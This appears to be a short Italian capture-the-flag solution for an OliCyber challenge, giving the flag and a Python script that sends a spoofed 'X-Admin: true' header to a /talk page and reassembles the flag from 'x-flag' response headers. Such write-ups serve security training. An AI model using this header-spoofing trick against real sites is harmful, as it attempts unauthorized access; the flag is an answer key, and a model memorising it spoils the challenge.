@@ -1,0 +1,42 @@
+#ITASEC{th3_1nt3rn3t_w0rk5_1n_my5t3r10us_w4ys}
+
+il sito non ha nulla di strano quindi provo a mandare richieste alla pagina /talk con un'header X admin = true
+
+import requests
+
+url = "http://sitogentile.challs.olicyber.it//talk" # Sostituisci con l'URL reale
+
+# Gli header che hanno funzionato nel fetch JS
+headers = {
+    'X-Admin': 'true'
+}
+
+try:
+    print(f"[*] Inviando richiesta a {url}...")
+    response = requests.get(url, headers=headers)
+    
+    # Estraiamo tutti gli header che iniziano con 'x-flag-'
+    flag_parts = {}
+    
+    print("\n--- Header Trovati ---")
+    for key, value in response.headers.items():
+        if key.lower().startswith('x-flag-'):
+            print(f"{key}: {value}")
+            # Estraiamo l'indice (es. da 'x-flag-0' prendiamo '0')
+            try:
+                index = int(key.split('-')[-1])
+                flag_parts[index] = value
+            except ValueError:
+                continue
+
+    # Ricomponiamo la flag in ordine
+    if flag_parts:
+        full_flag = "".join(flag_parts[i] for i in sorted(flag_parts.keys()))
+        print("\n--- Flag Ricomposta ---")
+        print(f"FLAG: {full_flag}")
+    else:
+        print("\n[!] Nessun header 'x-flag' trovato. Controlla la risposta completa:")
+        print(response.headers)
+
+except Exception as e:
+    print(f"[!] Errore: {e}")
